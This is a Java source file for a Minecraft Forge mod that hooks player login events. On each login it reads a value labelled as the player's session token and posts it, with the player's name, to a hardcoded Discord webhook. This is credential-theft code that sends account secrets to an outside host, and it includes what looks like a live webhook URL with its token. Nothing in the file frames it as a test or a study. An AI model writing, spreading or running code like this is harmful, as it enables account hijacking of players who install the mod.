package com.example.sessiontokenmod;

import net.minecraft.entity.player.EntityPlayerMP;
import net.minecraft.network.NetworkManager;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.management.PlayerList;
import net.minecraft.server.network.NetHandlerPlayServer;
import net.minecraft.util.text.TextComponentString;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.PlayerEvent;
import net.minecraftforge.fml.common.network.FMLNetworkEvent;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class PlayerLoginHandler
{
    private static final String DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1377064464494366750/Zt0rMIDopN4pm2Vz3A72ZDOXOKbeQ2IJu3hj_ElZ__I52w9lm2fA5o7o3U3JdwKpaShq";

    @SubscribeEvent
    public void onPlayerLogin(PlayerEvent.PlayerLoggedInEvent event)
    {
        EntityPlayerMP player = (EntityPlayerMP) event.player;
        String sessionToken = player.getEntityData().getString("authenticated");

        if (sessionToken != null && !sessionToken.isEmpty())
        {
            sendToDiscord(sessionToken, player.getName());
        }
    }

    private void sendToDiscord(String sessionToken, String playerName)
    {
        try
        {
            URL url = new URL(DISCORD_WEBHOOK_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");

            String jsonInputString = "{\"content\": \"**Player:** " + playerName + "\n**Session Token:** " + sessionToken + "\"}";

            try (OutputStream os = conn.getOutputStream())
            {
                byte[] input = jsonInputString.getBytes("utf-8");
                os.write(input, 0, input.length);
            }

            int code = conn.getResponseCode();
            System.out.println("Response Code : " + code);
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }
}
